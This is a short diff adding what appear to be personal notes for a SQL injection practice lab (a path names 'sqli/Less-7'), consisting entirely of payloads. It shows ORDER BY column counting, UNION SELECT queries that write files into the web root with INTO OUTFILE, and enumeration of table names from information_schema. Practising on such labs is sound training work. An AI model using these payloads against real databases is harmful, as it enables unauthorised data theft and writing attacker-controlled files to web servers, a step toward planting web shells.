@@ -1,0 +1,5 @@
+order by 1,2,3 # till we receive error
+
+union select 1,2,3 into outfile "/var/www/html/sqli/Less-7/om1.txt"
+
+union select 1,table_name,3 from information_schema.tables where table_schema=database() into outfile "/var/www/html/sqli/Less-7/om2.txt"
